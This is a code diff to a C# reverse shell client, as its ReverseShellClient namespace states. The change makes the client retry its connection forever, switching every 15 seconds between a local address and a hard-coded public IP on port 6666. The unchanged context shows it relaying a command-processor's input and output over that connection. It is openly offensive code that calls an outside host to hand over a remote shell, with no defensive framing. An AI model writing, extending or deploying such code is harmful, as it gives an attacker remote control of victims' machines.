@@ -19,17 +19,21 @@ namespace ReverseShellClient
 
         static void Main(string[] args)
         {
-            string ip = args.Length > 0 ? args[0] : "192.168.1.222";
-            int port = args.Length > 1 ? int.Parse(args[1]) : 6666;
+            int port = args.Length > 0 ? int.Parse(args[0]) : 6666;
 
-            Console.WriteLine($"Connect to: {ip}:{port}");
+            string[] ips = { args.Length > 1 ? args[1] : "192.168.1.222", args.Length > 2 ? args[2] : "93.103.116.226" }; // toggle between local & public ip
+            int ipIndex = 0;
 
-            while (tcpClient == null || !tcpClient.Connected)
+            Console.WriteLine($"Connect to: {ips[0]} or {ips[1]} on {port}");
+
+            while (true)
             {
-                Console.WriteLine("Trying to connect");
+                string tryIp = ips[ipIndex];
+                ipIndex = (ipIndex + 1) % ips.Length;
+                Console.WriteLine($"Trying to connect ({tryIp})");
 
-                ConnectToServer(ip, port);
-                System.Threading.Thread.Sleep(15000); //Wait 5 seconds 
+                ConnectToServer(tryIp, port);
+                System.Threading.Thread.Sleep(15000); //Wait 15 seconds 
             }
         }
 
@@ -85,7 +89,7 @@ namespace ReverseShellClient
                     processCmd.StandardInput.WriteLine(strInput);
                     strInput.Remove(0, strInput.Length);
                 }
-                catch (Exception err)
+                catch (Exception)
                 {
                     Cleanup();
                     break;
@@ -98,7 +102,7 @@ namespace ReverseShellClient
             {
                 processCmd.Kill();
             }
-            catch (Exception err)
+            catch (Exception)
             {
             };
 
@@ -124,7 +128,7 @@ namespace ReverseShellClient
                     streamWriter.WriteLine(strOutput);
                     streamWriter.Flush();
                 }
-                catch (Exception err) { }
+                catch (Exception) { }
             }
         }
     }
